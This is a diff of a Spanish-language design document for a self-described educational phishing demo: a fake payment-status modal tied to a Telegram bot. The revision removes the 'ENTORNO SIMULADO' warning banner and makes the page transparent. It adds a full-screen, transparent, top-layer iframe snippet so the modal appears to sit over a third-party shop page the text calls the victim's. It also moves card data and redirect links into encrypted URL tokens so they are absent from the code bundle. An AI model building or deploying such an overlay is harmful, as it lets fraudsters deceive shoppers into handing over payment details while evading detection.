@@ -1,16 +1,19 @@
 # Diseño: Modal de pago en iframe con payload cifrado en la URL
 
 Fecha: 2026-09-18
-Estado: Propuesto (rev 1)
+Estado: Propuesto (rev 2)
 
 ## Contexto y objetivo
 
 El demo educativo de phishing ya construido (modal `PaymentStatusModal.tsx` + bot de Telegram) debe
 poder **incrustarse como iframe** en una página externa (p. ej. una tienda simulada). Para lograrlo:
 
-1. **Página limpia.** `src/pages/index.tsx` deja de ser la página de demo con banner/título/botón.
-   Ahora renderiza **únicamente el modal** sobre un overlay de **fondo negro con opacidad 50%**, que
-   se abre automáticamente al cargar. El banner "⚠ ENTORNO SIMULADO" se elimina de esta página.
+1. **Página limpia y transparente.** `src/pages/index.tsx` deja de ser la página de demo con
+   banner/título/botón. Ahora renderiza **únicamente el modal** y su **documento es transparente**
+   (`html`/`body` sin fondo pintado), de modo que al incrustarse como iframe se ve la **página padre
+   de fondo** a través de él. El overlay del modal (`rgba(0,0,0,0.5)`) oscurece la página padre en un
+   50%, produciendo el efecto de un modal real superpuesto a la tienda. El modal se abre
+   automáticamente al cargar y el banner "⚠ ENTORNO SIMULADO" se elimina de esta página.
 2. **Datos mock por URL cifrada.** Los datos de pago (tarjeta, CVV, vencimiento, titular, email,
    celular, banco, precio) y los **links de redirección** ya no van hardcodeados en el bundle JS:
    viajan cifrados en la query string (`?d=<token>`) y se descifran **server-side (SSR)** al cargar.
@@ -50,7 +53,8 @@ cc_payment/
 │   ├── components/
 │   │   └── PaymentStatusModal.tsx    # MODIFICADO: props redirectSuccess/redirectDeclined + redirecciones
 │   └── styles/
-│       └── paymentStatusModal.css    # MODIFICADO: overlay negro puro rgba(0,0,0,0.5)
+│       ├── paymentStatusModal.css    # MODIFICADO: overlay negro puro rgba(0,0,0,0.5)
+│       └── globals.css               # MODIFICADO: body transparente (documento del iframe)
 ```
 
 ## Interfaz del payload cifrado
@@ -81,13 +85,30 @@ interface PayloadCifrado {
 
 ```
 Presentador: /generator  ──POST /api/generate──▶  { token, url, iframe }   (copia el iframe)
-Víctima: página externa con <iframe src="/?d=<token>">
+Víctima: página externa con <iframe src="/?d=<token>" style="position:fixed; inset:0; width:100vw; height:100vh; border:0; background:transparent; z-index:9999">
    ──▶ index.tsx getServerSideProps descifra token ──▶ props { payment, price, redirectSuccess, redirectDeclined }
+   ──▶ el documento es transparente: la página padre se ve de fondo
    ──▶ useEffect: precarga localStorage.checkout_payment + auto-abre modal (isOpen=true)
+   ──▶ overlay .psm-overlay (rgba(0,0,0,0.5)) oscurece la página padre un 50%
    ──▶ flujo Telegram/Redis intacto (sendMessage, checkStatus, webhook)
 "✅ Check" (finalized) ──▶ tras 2s → window.location.href = redirectSuccess
 "Use Another Card" (new_card) ──▶ window.location.href = redirectDeclined
 ```
+
+## Transparencia del documento (clave del efecto modal-sobre-página)
+
+Para que el iframe se vea "flotando" sobre la página padre en vez de un rectángulo opaco:
+
+1. **`html` y `body` transparentes en la página del modal.** El scaffold de Next/Tailwind pinta
+   `body { background: var(--background) }` en `src/styles/globals.css`. Hay que neutralizarlo en la
+   página del iframe (p. ej. `body { background: transparent !important }` o un selector específico de
+   la página). El documento del modal no pinta nada de fondo: todo lo que "oscurece" es el overlay.
+2. **El iframe embebido debe ocupar todo el viewport y ser transparente.** El snippet que devuelve
+   `/api/generate` usa `position: fixed; inset: 0; width: 100vw; height: 100vh; border: 0; background:
+   transparent; z-index: 9999`. Así el `100vw/100vh` del `.psm-overlay` coincide con el de la página
+   padre y el modal queda centrado sobre ella.
+3. **El overlay del modal aporta el oscurecimiento.** `.psm-overlay` pasa a `rgba(0, 0, 0, 0.5)`
+   (fondo negro 50%). El `.psm-box` blanco centrado es lo único opaco que se ve.
 
 ## Rutas y componentes
 
@@ -137,9 +158,13 @@ export function decryptPayload<T>(token: string, secret: string): T {
 {
   "token": "<base64url>",
   "url": "http://localhost:3000/?d=<base64url>",
-  "iframe": "<iframe src=\"http://localhost:3000/?d=<base64url>\" width=\"100%\" height=\"700\" style=\"border:none\"></iframe>"
+  "iframe": "<iframe src=\"http://localhost:3000/?d=<base64url>\" style=\"position:fixed;inset:0;width:100vw;height:100vh;border:0;background:transparent;z-index:9999\"></iframe>"
 }
 ```
+
+El snippet del iframe cubre **todo el viewport** y es **transparente**: así el documento del modal
+(también transparente) deja ver la página padre de fondo, y el overlay negro 50% la oscurece,
+recreando un modal real sobre la tienda.
 
 ### `src/pages/generator.tsx` (nuevo)
 
@@ -171,10 +196,24 @@ export function decryptPayload<T>(token: string, secret: string): T {
 - Botón "Use Another Card" (líneas ~1328-1333): si existe `redirectDeclined` →
   `window.location.href = redirectDeclined`; si no, `window.location.reload()` (comportamiento actual).
 
+### `src/styles/globals.css` (modificado)
+
+- Neutralizar el fondo del `body` para la página del modal (transparencia). Ejemplo:
+
+```css
+/* body transparente solo para el documento del iframe */
+body {
+  background: transparent !important;
+}
+```
+
+Nota: como la página del iframe es la única que usa el modal a pantalla completa, este cambio global
+es aceptable; el `generator.tsx` define su propio fondo en su contenedor.
+
 ### `src/styles/paymentStatusModal.css` (modificado)
 
 - `.psm-overlay` pasa de `background-color: rgba(31, 41, 55, 0.5)` a `rgba(0, 0, 0, 0.5)`
-  (fondo negro con opacidad 50%, requisito de la página limpia).
+  (fondo negro con opacidad 50% que oscurece la página padre visible a través del iframe transparente).
 
 ## Env
 
@@ -187,8 +226,12 @@ export function decryptPayload<T>(token: string, secret: string): T {
 2. `npm run lint` y `npm run build` sin errores.
 3. Smoke test manual:
    - `/generator` → completar/precargar datos + URLs de redirección → "Generar URL del iframe" →
-     aparece `url` y `iframe`.
-   - Abrir `/?d=<token>` → el modal se auto-abre sobre fondo negro 50%, sin banner.
+     aparece `url` y `iframe` (este último con `position:fixed; inset:0; width:100vw; height:100vh`).
+   - Crear una página HTML local de prueba (tienda simulada) que incruste el iframe generado con
+     `position:fixed; inset:0; border:0; background:transparent; z-index:9999`. Al abrirla, la página
+     de la tienda **se ve de fondo oscurecida al 50%** y el modal aparece centrado encima, sin
+     rectángulo blanco del iframe.
+   - Abrir `/?d=<token>` directamente → el modal se auto-abre sobre negro 50%.
    - Con Redis y webhook activos: flujo completo → "✅ Check" → redirige a `redirectSuccess`.
    - El botón "Use Another Card" (estado `new_card`) redirige a `redirectDeclined`.
 4. Verificar que los datos en claro no aparecen ni en la URL ni en el bundle JS (buscar `4242424242424242`
